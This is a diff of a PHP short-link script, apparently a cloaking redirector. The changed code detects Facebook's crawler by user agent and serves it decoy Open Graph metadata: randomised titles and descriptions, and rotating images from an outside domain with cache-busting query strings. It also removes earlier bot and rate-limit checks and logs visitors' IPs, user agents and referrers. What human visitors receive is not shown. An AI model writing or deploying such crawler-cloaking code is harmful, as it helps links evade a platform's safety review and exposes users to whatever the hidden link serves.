@@ -1,7 +1,24 @@
 <?php
 require_once 'mobile_protection.php';
 
-session_start();
+function generateRandomString($length = 6) {
+    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    $str = '';
+    for ($i = 0; $i < $length; $i++) {
+        $str .= $chars[random_int(0, strlen($chars) - 1)];
+    }
+    return $str;
+}
+
+$fbAppId = '1604020986967005'; // Your Facebook App ID
+
+$botImages = [
+    'https://chatdatlng.biz.id/images/white1.jpg',
+    'https://chatdatlng.biz.id/images/white2.jpg',
+    'https://chatdatlng.biz.id/images/white3.jpg',
+    'https://chatdatlng.biz.id/images/white4.jpg',
+    'https://chatdatlng.biz.id/images/white5.jpg'
+];
 
 $token = $_GET['token'] ?? '';
 
@@ -26,75 +43,43 @@ if (!$linkData) {
     exit;
 }
 
-function isBot() {
+function isFacebookBot() {
     $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
-    $botSignatures = [
-        'facebookexternalhit', 'Facebot', 'Facebook', 'FB_IAB', 'FBAN/', 'FBAV/', 'FBDV/', 'FBMD/',
-        'bot', 'spider', 'crawler', 'headless', 'phantomjs', 'selenium', 'curl', 'wget'
-    ];
+    $fbBots = ['facebookexternalhit', 'Facebot', 'Facebook'];
 
-    foreach ($botSignatures as $sig) {
-        if (stripos($userAgent, $sig) !== false) {
+    foreach ($fbBots as $bot) {
+        if (stripos($userAgent, $bot) !== false) {
             return true;
         }
     }
-
-    if (empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) || empty($_SERVER['HTTP_ACCEPT'])) {
-        return true;
-    }
-
     return false;
 }
 
-function isRateLimited($ip) {
-    $limit = 5;
-    $timeWindow = 60;
-    $logFile = __DIR__ . '/rate_limit.log';
-
-    if (!file_exists($logFile)) {
-        file_put_contents($logFile, '');
-    }
-
-    $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-    $now = time();
-    $recentClicks = 0;
-    $newLines = [];
-
-    foreach ($lines as $line) {
-        list($timestamp, $loggedIp) = explode(',', $line);
-        if ($now - (int)$timestamp < $timeWindow) {
-            $newLines[] = $line;
-            if ($loggedIp === $ip) {
-                $recentClicks++;
-            }
-        }
-    }
-
-    if ($recentClicks >= $limit) {
-        return true;
-    }
-
-    $newLines[] = $now . ',' . $ip;
-    file_put_contents($logFile, implode("\n", $newLines) . "\n");
-
-    return false;
-}
-
-if (isBot()) {
-    header('Content-Type: text/html; charset=utf-8');
-    $title = htmlspecialchars($linkData['og']['title'] ?? '');
-    $description = htmlspecialchars($linkData['og']['description'] ?? '');
-    $image = htmlspecialchars($linkData['og']['image'] ?? '');
+if (isFacebookBot()) {
+    $title = htmlspecialchars($linkData['og']['title'] ?? '') . ' ' . generateRandomString();
+    $description = htmlspecialchars($linkData['og']['description'] ?? '') . ' ' . generateRandomString();
+    $image = $botImages[array_rand($botImages)] . '?v=' . generateRandomString(6);
     $url = htmlspecialchars('https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
-    $fbAppId = '1604020986967005';
-    echo "<!DOCTYPE html><html><head><title>{$title}</title><meta property='fb:app_id' content='{$fbAppId}'/><meta property='og:title' content='{$title}'/><meta property='og:description' content='{$description}'/><meta property='og:image' content='{$image}'/><meta property='og:image:width' content='1200'/><meta property='og:image:height' content='630'/><meta property='og:url' content='{$url}'/><meta property='og:type' content='website'/></head><body><div style='display:none;'>{$description}</div></body></html>";
-    exit;
-}
-
-$ip = $_SERVER['REMOTE_ADDR'] ?? '';
-if (isRateLimited($ip)) {
-    http_response_code(429);
-    echo 'Too many requests. Please try again later.';
+    header('Content-Type: text/html; charset=utf-8');
+    echo <<<HTML
+<!DOCTYPE html>
+<html>
+<head>
+    <title>{$title}</title>
+    <meta property="fb:app_id" content="{$fbAppId}" />
+    <meta property="og:title" content="{$title}" />
+    <meta property="og:description" content="{$description}" />
+    <meta property="og:image" content="{$image}" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:url" content="{$url}" />
+    <meta property="og:type" content="website" />
+</head>
+<body>
+    <div style="display:none;">{$description}</div>
+</body>
+</html>
+HTML;
     exit;
 }
 
@@ -105,7 +90,7 @@ $clicks = json_decode(file_get_contents(__DIR__ . '/clicks.json'), true) ?? [];
 $clicks[] = [
     'token' => $token,
     'timestamp' => time(),
-    'ip' => $ip,
+    'ip' => $_SERVER['REMOTE_ADDR'] ?? '',
     'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
     'referrer' => $_SERVER['HTTP_REFERER'] ?? ''
 ];
